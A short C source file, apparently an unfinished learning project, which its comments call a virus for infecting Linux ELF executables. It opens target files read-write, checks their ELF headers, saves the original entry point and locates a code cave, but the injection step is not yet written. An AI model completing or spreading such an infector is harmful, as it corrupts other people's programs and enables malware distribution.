// virus.c
// written by Kate Rodionoff
// on 06/10/23
// virus that infects ELF executable files on Linux

// verify that file is an ELF executable
// find entry point
// inject simple code (to start with)

#include "include/ElfFile.h"
#include "include/CodeCave.h"
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

#define MIN_ARGS 2

int main(int argc, char **argv) {
    if (argc < MIN_ARGS) {
        fprintf(stderr, "Too few arguments to call program\n");
        exit(0);
    }

    for (int i = 1; i < argc; i++) {
        int fd = open(argv[i], O_RDWR);

        if (!Elf(fd)) {
            close(fd);
            continue;
        }

        Elf64_Ehdr ehdr = ElfExtractHeader(fd);
        Elf64_Phdr phdr = ElfExtractProgramHeader(fd);

        // store the original return address
        Elf64_Addr original = ehdr.e_entry;

        CodeCave codeCave = FindCodeCave(fd, phdr);
        
    }
}

